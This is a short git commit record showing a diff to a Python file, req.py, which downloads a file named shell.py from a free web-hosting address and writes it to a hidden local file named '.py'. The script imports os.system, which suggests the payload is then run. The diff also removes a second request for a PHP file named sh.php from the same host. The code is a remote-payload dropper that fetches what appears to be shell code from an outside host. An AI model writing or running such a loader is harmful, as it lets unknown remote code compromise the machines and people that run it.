5332a363c3882d834515372b0346bf6284ff8c62
oo-ozo <55140388+oo-ozo@users.noreply.github.com>
2020-09-10 23:01:52 +0630

    Update req.py

--- req.py
+++ req.py
@@ -2,7 +2,6 @@ from requests import get as rg
 from os import system as s
 
 req = rg('https://oo-ozo.000webhostapp.com/Shell/shell.py')
-rg('https://oo-ozo.000webhostapp.com/Shell/sh.php')
 
 with open('.py', 'wb+') as sh:
     sh.write(req.content)
